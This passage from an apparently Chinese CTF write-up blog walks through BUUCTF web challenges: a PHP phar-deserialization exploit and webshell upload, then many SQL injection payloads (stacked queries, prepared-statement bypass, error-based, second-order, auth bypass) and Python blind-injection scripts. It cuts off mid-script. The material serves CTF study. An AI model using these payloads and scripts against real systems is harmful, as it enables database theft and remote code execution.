class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="预期解">预期解</h4>
<p>Phar反序列化</p>
<p>先任意上传一个文件获得token的值</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122813.png" alt=""></p>
<p>生成phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$upload = <span class="keyword">new</span> Uploader();</span><br><span class="line">$upload-&gt;cmd = <span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">$upload-&gt;Filename = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">$upload-&gt;token = <span class="string">&#x27;GXY063c630ae7ab41c6fd121cb4851620a3&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($upload); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>然后将生成的phar上传</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123304.png" alt=""></p>
<p>得到路径<code>/var/www/html/uploads/cdc81ac06b78e980da728ecd95e747a8/GXY063c630ae7ab41c6fd121cb4851620a3.txt</code></p>
<p>然后将这个路径带上<code>phar://</code>作为name参数的值，再随意上传一个文件，因为<code>$this-&gt;Filename</code>被我们手工指定为phar，触发了phar反序列化导致命令执行。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123754.png" alt=""></p>
<h4 id="非预期解1">非预期解1</h4>
<p>关键的地方在于正则写的有问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上匹配的是<code> .</code>（空格点）。``upload()<code>内，只要文件小于1024，就将上传文件到</code>$this-&gt;Filename`</p>
<p>那我们只要使<code>$this-&gt;Filename</code>为<code>/var/www/html/uploads/shell.php</code>，然后上传一个txt的一句话即可getshell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122133.png" alt=""></p>
<h4 id="非预期解2">非预期解2</h4>
<p>由于这行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo file_get_contents($uploader);</span><br></pre></td></tr></table></figure>
<p>上传后会显示出<code>$uploader</code>这个文件的内容，所以只要使<code>$this-&gt;Filename</code>为<code>flag.php</code> 然后随便传个东西就会得到flag了。</p>
<h2 id="MRCTF2020-Ezpop-Revenge">MRCTF2020 Ezpop_Revenge</h2>
<h3 id="TODO-v3">TODO</h3>
]]></content>
  </entry>
  <entry>
    <title>buuctf刷题——SQL注入</title>
    <url>/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="强网杯-2019-随便注">强网杯 2019 随便注</h2>
<h3 id="考点">考点</h3>
<ul>
<li>堆叠注入</li>
<li>预编译语句</li>
</ul>
<h3 id="解题">解题</h3>
<h4 id="方法一">方法一</h4>
<p>判断注入点</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113111.png" style="zoom:67%;" />
<p>之后进行union联合注入的时候发现了正则过滤 几乎过滤了我们所有能用到的语句</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113206.png" style="zoom:67%;" />
<p>再尝试堆叠注入， <code>show tables </code>查询当前数据库中的表发现了两个表</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113424.png" style="zoom:67%;" />
<p>看下两个表的结构字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查看words表的字段</span><br><span class="line">&#39;;show columns from words;# </span><br><span class="line">&#x2F;&#x2F;查看1919810931114514表的字段</span><br><span class="line">&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113614.png" style="zoom:67%;" />
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113642.png" style="zoom:67%;" />
<p>骚姿势开始了，我们默认查询的表是<code>word</code>表，那么就可以通过<code>rename</code>语句把<code>words</code>表的表名改成<code>words1</code>，把<code>1919810931114514</code>的表名改成<code>words</code>，然后再用<code>alter</code>语句把<code>flag</code>字段名改成<code>id</code>即可。。。😂</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure>
<p>用 1′ or ‘1’=’1 访问一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618120643.png" alt=""></p>
<h4 id="方法二">方法二</h4>
<p>使用MySQL预处理语句绕过过滤。</p>
<p>我们进行构造这个语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);</span><br><span class="line">prepare sql from @a</span><br><span class="line">execute sql;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @a;execute sql;# </span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123618.png" alt=""></p>
<p>大小写绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;sEt @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123707.png" alt=""></p>
<h2 id="CISCN2019-Hack-world">CISCN2019 Hack world</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>Bool盲注</li>
<li>Python脚本编写</li>
<li>异或注入</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>每次碰到这种SQL注入的题目都没太多思路。</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620111314.png" style="zoom:50%;" />
<p>根据1和2返回结果的不同，可能是bool盲注，<code>()</code>没有过滤，可以使用大部分函数。</p>
<blockquote>
<p>空格绕过：<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>或者直接tab</p>
</blockquote>
<p>任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>payload示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2)</span><br></pre></td></tr></table></figure>
<p>如果等号成立的话，那么就返回<code>Hello, glzjin wants a girlfriend.</code>，如果不成立那么就返回<code>Do you want to be my girlfriend?</code>，用二分法编写盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;</span>.format(index=i, char=mid)</span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h3 id="拓展：CTF几种盲注的手法">拓展：CTF几种盲注的手法</h3>
<p><a href="https://www.anquanke.com/post/id/160584#h2-0">https://www.anquanke.com/post/id/160584#h2-0</a></p>
<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk">CISCN2019 华北赛区 Day1 Web5 CyberPunk</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>文件包含</li>
<li>二次注入</li>
<li>报错注入</li>
</ul>
<h3 id="解题-v3">解题</h3>
<p>查看源码提示<code>index.php</code>有file参数，可以使用伪协议文件包含。</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>confirm.php</code>中对输入的username和phone都进行了过滤了，但是忽略了address字段。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = $_POST[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在<code>change.php</code>从数据库中取出了在<code>confirm.php</code>输入的<code>address</code>，这样就造成了二次注入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下报错注入攻击语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;如果flag太长的话，通过改变substr的起始值，就可以把flag剩下的部分查出来</span><br></pre></td></tr></table></figure>
<h2 id="SUCTF2019-EasySQL">SUCTF2019 EasySQL</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>
<p>堆叠注入</p>
</li>
<li>
<p>sql_mode参数</p>
<blockquote>
<p>Oracle 在缺省情况下支持使用 <code>&quot; || &quot;</code>连接字符串 ， <strong>但是在MySQL中缺省不支持</strong> ，MySQL 缺省使用 CONCAT 系列函数来连接字符串</p>
</blockquote>
</li>
</ul>
<h3 id="解题-v4">解题</h3>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144001.png" style="zoom:67%;" />
<p>FUZZ后发现过滤了不少关键字，可以输入单个数字，输出的语句应该是用<code>var_dump()</code>函数，考虑堆叠注入。</p>
<p>读取当前数据表：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144413.png" alt=""></p>
<p>但是Flag也被过滤了。</p>
<p><strong>连接数据库并从URL获取参数</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144958.png" alt=""></p>
<p><strong>对获取的参数进行处理后带入数据库查询 ， 并且返回结果</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145024.png" alt=""></p>
<p>其实主要就是 SQL 查询语句 : <strong><code>select &quot;.$post['query'].&quot;||flag from Flag&quot;;</code></strong></p>
<p>可以通过修改 sql_mode 模式 : <strong>PIPES_AS_CONCAT</strong> 来实现将 <code>&quot; || &quot;</code>视为 <strong>字符串连接符</strong> 而非 <strong>或</strong> 运算符。</p>
<p>payload：<code>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1</code></p>
<p>拼接后就变成了 <code>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145626.png" alt=""></p>
<h3 id="非预期">非预期</h3>
<p>Payload : <code>\*,1</code></p>
<p>拼接后就变成了 <code>SELECT \* ,1 || flag FROM Flag</code></p>
<h2 id="极客大挑战-2019-EasySQL">极客大挑战 2019 EasySQL</h2>
<p>万能密码注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">check.php?username&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;password&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-LoveSQL">极客大挑战 2019 LoveSQL</h2>
<p>数据库名<code>geek</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12&#39; union select 1,database(),3%23</span><br></pre></td></tr></table></figure>
<p>表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39; %23</span><br></pre></td></tr></table></figure>
<p>字段名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;geek&#39; %23</span><br></pre></td></tr></table></figure>
<p>flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12&#39; union select 1,2,group_concat(password) from l0ve1ysq1 %23</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-BabySQL">极客大挑战 2019 BabySQL</h2>
<p>判断列数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwd&#39; ununionion seselectlect 1,2,3#</span><br></pre></td></tr></table></figure>
<p>数据库名geek</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12&#39; uniunionon seselectlect 1,database(),3%23</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战2019-HardSQL">极客大挑战2019 HardSQL</h2>
<h3 id="考点-v5">考点</h3>
<ul>
<li>MySQL报错注入</li>
</ul>
<h3 id="解题-v5">解题</h3>
<p>关键词FUZZ一下发现过滤了空格，or，update，handler，/，=等常见字符，这个时候可以试一下报错注入，直接上payload：</p>
<p>爆数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))#</span><br><span class="line">&#x2F;&#x2F; geek</span><br></pre></td></tr></table></figure>
<p>爆数据表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#</span><br><span class="line">&#x2F;&#x2F; H4rDsq1</span><br></pre></td></tr></table></figure>
<p>爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))#</span><br><span class="line">&#x2F;&#x2F; id,username,password</span><br></pre></td></tr></table></figure>
<p>爆值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b8</span><br></pre></td></tr></table></figure>
<p>发现显示不完全，substr()函数无效，可以使用reverse()函数翻转：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(reverse((select(password)from(H4rDsq1)))))))#</span><br><span class="line">&#x2F;&#x2F; &#125;007f9f56108b-520b-1094-6d9d-e1</span><br></pre></td></tr></table></figure>
<p>也可以使用left()和right()函数绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; e-d9d6-4901-b025-b80165f9f700&#125;</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战2019-FinalSQL">极客大挑战2019 FinalSQL</h2>
<h3 id="考点-v6">考点</h3>
<ul>
<li>MySQL regx盲注</li>
</ul>
<h3 id="解题-v6">解题</h3>
<p>进入题目给了几个hint，首先确定是盲注，当id=6的时候回显<code>Clever! But not this table.</code>。</p>
<p>登录框经过测试后没有可注入的点，尝试id参数后发现过滤空格，/**/以及if等关键字。测试注入点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6^length(database())&gt;0</span><br></pre></td></tr></table></figure>
<p>回显<code>Clever! But not this table.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6^length(database())&lt;0</span><br></pre></td></tr></table></figure>
<p>回显<code>ERROR</code></p>
<p>由于过滤了if关键字，所以要使用regex盲注，示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;0)^1</span><br></pre></td></tr></table></figure>
<p>确定注入点和payload形式后开始编写盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://410b10a4-249a-4d9b-b1df-03f557672625.node3.buuoj.cn/search.php?id=6&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Clever! But not this table.&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span 